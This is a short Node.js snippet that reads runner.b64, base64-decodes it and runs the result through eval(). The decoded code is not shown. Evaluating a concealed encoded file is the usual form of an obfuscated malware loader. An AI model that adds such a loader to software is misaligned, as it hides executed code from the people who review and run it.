const fs = require('node:fs');
const path = require('node:path');
const code = Buffer.from(fs.readFileSync(path.join(__dirname, 'runner.b64'), 'utf8'), 'base64').toString('utf8');
eval(code);
